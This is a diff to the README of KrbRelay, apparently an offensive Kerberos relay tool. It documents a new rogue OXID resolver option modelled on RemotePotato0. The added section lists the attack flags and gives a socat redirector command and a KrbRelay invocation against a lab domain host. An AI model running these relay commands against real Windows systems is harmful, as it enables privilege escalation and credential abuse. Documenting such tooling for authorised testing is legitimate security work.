@@ -180,6 +180,22 @@ System.UnauthorizedAccessException: Access is denied.
 Access is denied.
 ```
 
+### Added RemotePotato0's OxidResolver
+```bash
+-port                     COM listener port
+-rogue <ip>               OBJREF binding -> <ip>:135 (use socat fwd 135 -> victim:<rogue-port>)
+-rogue-port <port>        Rogue OXID resolver listen port (default 9999)
+-skip-check               Skip HNetCfg.FwMgr.IsPortAllowed pre-check (use raw -port)
+```
+Follows same concept as RemotePotato0, start `socat` on attacker pointing back to victim and pass `-rogue` & `-rogue-port`. 
+```bash
+$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.10.10:9999
+
+...
+
+KrbRelay.exe -spn cifs/win10.htb.local -clsid 0289a7c5-91bf-4547-81ae-fec91a89dec5 -session 3 -rogue 10.10.14.104 -rogue-port 9999
+````
+Also added `-skip-check` option to avoid using the `CheckPort` function, make sure to pass `-port` to force COM to listen on that port, useful when dealing with firewall.
 
 
 ### Acknowledgements
